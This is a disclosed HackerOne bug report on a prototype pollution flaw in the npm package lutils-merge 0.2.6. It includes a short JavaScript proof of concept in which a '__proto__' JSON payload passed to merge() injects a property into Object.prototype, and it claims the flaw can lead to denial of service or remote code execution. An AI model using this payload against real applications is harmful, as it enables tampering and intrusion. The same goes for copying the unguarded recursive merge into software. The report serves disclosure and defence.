# Prototype pollution attack (lutils-merge)

## Report Details
- **Report ID**: 439107
- **URL**: https://hackerone.com/reports/439107
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-11-11T14:18:51.548Z
- **Disclosed**: 2018-12-17T13:15:14.605Z

## Reporter
- **Username**: dienpv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi team,
I would like to report a prototype pollution vulnerability in lutils-merge
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lutils-merge
**version:** 0.2.6
**npm page:** `https://www.npmjs.com/package/lutils-merge`

## Module Description

> Merge javascript objects recursively.

## Module Stats
79 downloads in the last week

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar to my report #438274
lutils-merge is vulnerable to prototype pollution when it performs a recursive copy of the specified objects.

## Steps To Reproduce:

> In the following code snippet, "payload" would come from user-input (JSON data).
```javascript
var merge = require('lutils-merge');
var payload = '{"__proto__":{"polluted":"merge_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
merge({},JSON.parse(payload));
console.log("After: ", test.polluted);

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N 

Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Attachments
No attachments
